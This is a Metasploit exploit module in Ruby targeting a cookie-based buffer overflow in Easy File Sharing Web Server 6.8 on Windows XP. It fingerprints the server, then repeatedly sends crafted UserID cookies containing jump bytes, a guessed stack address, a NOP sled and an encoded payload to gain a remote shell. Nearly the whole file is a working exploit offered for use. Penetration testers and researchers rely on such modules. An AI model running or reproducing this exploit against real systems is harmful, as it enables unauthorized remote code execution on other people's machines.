##
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Easy File Sharing Web Server 6.8 USERID Remote Code Execution',
                      'Description'    => %q{
        By setting UserID in the cookie to a long string, we can overwrite EDX which
        allows us to control execution flow when the following instruction is
        executed: 0x0045C8C2: CALL DWORD PTR DS:[EDX+28]. More details available here:
        https://www.exploit-db.com/exploits/33352/

        This module is a port of an exploit written by superkojiman.
        Tested on: English version of Windows XP Professional SP2 and SP3
                      },
                        'License' => MSF_LICENSE,
                        'Author'  =>	[
                          'superkojiman - http://www.techorganic.com', # Exploit
                          'thesubtlety', # Metasploit Module
                        ],
                        'References' =>
                        [
                          [  'URL', 'https://www.exploit-db.com/exploits/33352/'  ]
                        ],
                        'DisclosureDate' => 'May 10 2014',
                        'Platform' => 'win',
                        'Payload' =>
                        {
                          'BadChars' => "\x00\x20\x0d\x3b\x0a",
                          'DisableNops' => true
                        },
                        'Privileged' => false,
                        'Targets' =>
                        [
                          [
                            'Windows XP Pro - SP2 and SP3',
                            {
                              'Platform' => 'win'
                            }
                          ]
                        ],
                        'DefaultOptions' => { 'EXITFUNC' => 'thread' },
                        'DefaultTarget' => 0))
  end

  def check
    res = send_request_cgi({ 'uri' => '/' })
    if (res && res.headers['Server']) =~ /Easy File Sharing Web Server v6\.8/
      return Exploit::CheckCode::Appears
    elsif (res && res.body.to_s) =~ /Easy File Sharing Web Server/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status "Trying #{rhost}:#{rport}..."
    print_status "If at first you don't succeed, try, try again :)"
    print_status "We're guessing an address on the stack. It will be a few moments..."

    (1..255).each do |i|
      n =
        if i < 16
          '0' + i.to_s(16)
        else
          i.to_s
        end

      # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
      guess = "0x01" + n + "6940"

      sploit =  rand_text_alpha(64)               # padding
      sploit += "\x81\xee\x70\xff\xff\xff"        # SUB ESI,-90
      sploit += "\xff\xe6"                        # JMP ESI
      sploit += rand_text_alpha(8)                # padding
      sploit += [guess.to_i(16)].pack("<I")       # overwrite EDX with
                                                  # pointer to CALL ESI
      sploit += rand_text_alpha(108)              # padding
      sploit += [0x10023701].pack("<I")           # pointer to CALL ESI
      sploit += make_nops(20)                     # NOP sled
      sploit += payload.encoded

      # send exploit
      send_request_cgi({
        'uri' => '/vfolder.ghp',
        'method' => 'GET',
        'headers' => {
          'Accept' => ' text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language' => 'en-us',
          'Accept-Encoding' => 'gzip, deflate',
          'Referer' => "http://#{rhost}",
          'Cookie' => "SESSIONID=6771; UserID=#{sploit}; PassWD=;",
          'Connection' => 'Keep-Alive'
        }
      }, 5)

      handler
      break if session_created?
    end
  end
end
